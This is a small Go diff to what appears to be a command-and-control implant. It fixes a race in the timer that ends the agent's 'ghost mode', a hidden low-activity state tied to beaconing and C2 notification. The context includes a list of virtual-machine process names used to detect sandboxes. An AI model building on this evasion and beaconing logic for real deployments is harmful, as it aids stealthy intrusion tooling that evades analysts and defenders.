@@ -21,6 +21,7 @@ var (
 	ghostTrigger     string           // passive trigger condition
 	ghostBeaconSent  bool             // whether last beacon was sent before hiding
 	ghostModeTimeout = 72 * time.Hour // auto-exit ghost mode after this duration
+	ghostModeGen     uint64           // bumped on enter/exit so a stale auto-exit timer cannot end a newer session
 
 	sandboxIndicators = []string{
 		"vmtoolsd", "vboxservice", "vboxtray", "xenservice",
@@ -77,8 +78,14 @@ func enterGhostMode(reason string) {
 	// Mark ghost mode in result for C2 notification
 	ghostTrigger = reason
 
-	// Auto-exit ghost mode after timeout so agent can recover
+	gen := atomic.AddUint64(&ghostModeGen, 1)
+	// Auto-exit only the session this timer was created for. Without the
+	// generation check, an exit + re-enter before the old timeout would let
+	// the old timer silently end the new session.
 	time.AfterFunc(ghostModeTimeout, func() {
+		if atomic.LoadUint64(&ghostModeGen) != gen {
+			return
+		}
 		if isInGhostMode() {
 			logDebug("Auto-exiting ghost mode after timeout")
 			exitGhostMode()
@@ -88,7 +95,7 @@ func enterGhostMode(reason string) {
 
 func exitGhostMode() {
 	atomic.StoreInt32(&inGhostMode, 0)
-	ghostTrigger = ""
+	atomic.AddUint64(&ghostModeGen, 1)
 	setSleepMode(SleepModeDefault)
 	requestBeaconWake()
 }
